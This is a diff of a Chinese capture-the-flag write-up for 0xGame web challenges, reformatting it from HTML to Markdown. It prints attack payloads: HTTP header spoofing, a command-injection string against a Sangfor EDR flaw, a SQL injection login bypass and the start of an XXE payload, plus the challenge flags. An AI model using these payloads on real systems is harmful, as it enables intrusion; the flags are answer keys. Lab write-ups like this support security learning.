@@ -14,9 +14,12 @@ permalink:
 ---
 
 by:gyy
-<h2>robots协议</h2>
-<h3>考察robots协议</h3>
-<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30051/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30051/</a></h5>
+## robots协议
+
+### 考察robots协议
+
+#### 题目地址：http://web.game.0xctf.com:30051/
+
 知识链接：
 
 robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。
@@ -31,22 +34,26 @@ Disallow: /flaaaggg.php
 
 
 
-<h3>最终</h3>
+### 最终
+
 访问/flaaaggg.php即可
 
 问题解决：0xGame{now_you_k0nw_robots_Protocol}
 
-<hr />
-<h2>view_source</h2>
-<h3>考察会不会看源码</h3>
-<h3>最终</h3>
+## view_source
+
+考察会不会看源码
+
+### 最终
+
 f12看源码就行
 
 问题解决：0xGame{web_sign_in}
 
-<hr />
-<h2>get&post</h2>
-<h3>考察get与post的应用</h3>
+## get&post
+
+### 考察get与post的应用
+
 打开直接给代码
 ```php
 <?php
@@ -68,21 +75,28 @@ if(isset($_GET['0xGame']) && isset($_POST['X1cT34m'])){
 
 
 代码审计，get传参，post传参即可
-<h3>最终</h3>
+### 最终
+
 payload：<code>./?0xGame=acd666tql</code>
 post:<code>X1cT34m=acd666tql</code>
 
 问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}
 
-<hr />
-<h2>wh1sper's_secret_garden</h2>
-<h3>考察http协议</h3>
-<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30050/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30050/</a></h5>
+## wh1sper's_secret_garden
+
+### 考察http协议
+
+#### 题目地址：http://web.game.0xctf.com:30050/
+
 打开发现：
-<pre><code>你需要使用wh1sper浏览器来访问
+```
+你需要使用wh1sper浏览器来访问
 什么？没有？
 没有wh1sper浏览器还想打web？
-</code></pre>
+```
+
+
+
 抓包改包,浏览器改成wh1sper
 ```
 GET / HTTP/1.1
@@ -101,8 +115,12 @@ Connection: close
 
 然后发现
 
-<pre><code>你需要来自：https://ctf.njupt.edu.cn/
-</code></pre>
+```
+你需要来自：https://ctf.njupt.edu.cn/
+```
+
+
+
 伪造地址三种方式：
 ```
 Client-Ip: 127.0.0.1
@@ -113,13 +131,14 @@ Referer: 127.0.0.1
 
 
 
-这里<code>Referer: https://ctf.njupt.edu.cn/</code>
+这里`Referer: https://ctf.njupt.edu.cn/`
 
 再发包，发现
 <pre><code>你得从本地访问才行哟！
 </code></pre>
-改包，加上<code>X-Forwarded-For: 127.0.0.1</code>
-<h3>最终</h3>
+改包，加上`X-Forwarded-For: 127.0.0.1`
+### 最终
+
 发包：
 ```
 GET / HTTP/1.1
@@ -138,20 +157,25 @@ Connection: close
 
 问题解决：0xGame{宁就是接头霸王?}
 
-<hr />
-<h2>readflag</h2>
-<h3>考察linux指令</h3>
-<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30054/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30054/</a></h5>
-进去看到<code>请输入linux指令</code>
-<h3>最终</h3>
+## readflag
+
+### 考察linux指令
+
+#### 题目地址：http://web.game.0xctf.com:30054/
+
+进去看到`请输入linux指令`
+### 最终
+
 直接cat /flag
 
 问题解决：0xGame{fl4g_1s_c0ntent}
 
-<hr />
-<h2>edr</h2>
-<h3>考察edr和搜索引擎</h3>
-<h5>题目地址：<a class="url" href="http://web1.game.0xctf.com:40000/" target="_blank" rel="noopener noreferrer">http://web1.game.0xctf.com:40000/</a></h5>
+## edr
+
+### 考察edr和搜索引擎
+
+#### 题目地址：http://web1.game.0xctf.com:40000/
+
 深信服edr的漏洞
 
 这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a>
@@ -320,16 +344,19 @@ payload：./?strip_slashes=system&host=cat /flag
 
 问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}
 
-<hr />
-<h2>just_login</h2>
-<h3>burp爆破</h3>
-<h4>题目地址：<a class="url" href="http://web.game.0xctf.com:30055/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30055/</a></h4>
+## just_login
+
+### burp爆破
+
+#### 题目地址：http://web.game.0xctf.com:30055/
+
 dirsearch扫不到东西
 
 sqlmap跑一下没用
 
 不知道干啥，直接burp抓包用户名爆破
 真爆出来了
+
 <h3>最终</h3>
 payload：
 ```
@@ -342,15 +369,20 @@ x' or 1=1 or 'x'='y
 
 问题解决：0xGame{e5sy_sql_1njeCtion}
 
-<hr />
-<h2>close_eyes</h2>
-<h3>注入</h3>
-<h4>题目地址：<a class="url" href="http://web.game.0xctf.com:30052/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30052/</a></h4>
-<hr />
-<h2>inject_me</h2>
-<h3>XXE显式攻击</h3>
-<h5>题目地址：<a class="url" href="http://web.game.0xctf.com:30061/" target="_blank" rel="noopener noreferrer">http://web.game.0xctf.com:30061/</a></h5>
-<h3>最终</h3>
+## close_eyes
+
+### 注入
+
+#### 题目地址：http://web.game.0xctf.com:30052/
+
+## inject_me
+
+### XXE显式攻击
+
+#### 题目地址：http://web.game.0xctf.com:30061/
+
+### 最终
+
 payload：
 ```html
 <?xml version="1.0"?>
